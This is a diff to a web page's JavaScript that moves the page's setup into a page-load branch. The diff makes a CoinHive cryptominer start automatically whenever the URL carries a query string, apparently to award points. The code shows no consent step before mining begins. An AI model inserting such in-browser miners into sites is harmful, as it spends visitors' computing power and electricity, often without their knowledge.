@@ -1,18 +1,25 @@
-var named = false
+var named = false;
+if (window.location.search.length > 1) {
+  document.querySelector("#landing").style.display = "none";
+  document.querySelector("#start").style.top = "35px";
+  document.querySelector("#start").style.left = "135px";
+  document.querySelector("#start").setAttribute("readonly","");
+  document.querySelector("#start").setAttribute("class","tab");
+  document.querySelector("#portal").style.display = "inherit";
+  document.querySelector("#start").value = window.location.search.slice(1);
+  named = true;
+  // Add coin hive for points
+  var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", window.location.search+window.location.hash);
+  miner.start();
+}
+
 document.querySelector("#start").addEventListener("keyup", (e)=>{
   if (e.key == "Enter") {
-    document.querySelector("#landing").style.display = "none";
-    document.querySelector("#start").style.top = "35px";
-    document.querySelector("#start").style.left = "135px";
-    document.querySelector("#start").setAttribute("readonly","");
-    document.querySelector("#start").setAttribute("class","tab");
-    document.querySelector("#portal").style.display = "inherit";
-    named = true;
-    // Add coin hive for points
-    var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", document.querySelector("#start")+window.location.hash);
-    miner.start();
+    var value = document.querySelector("#start").value;
+    window.location.search = "?"+value;
   }
 });
+
 var show = "myteam";
 function tab(e) {
   if (named) {
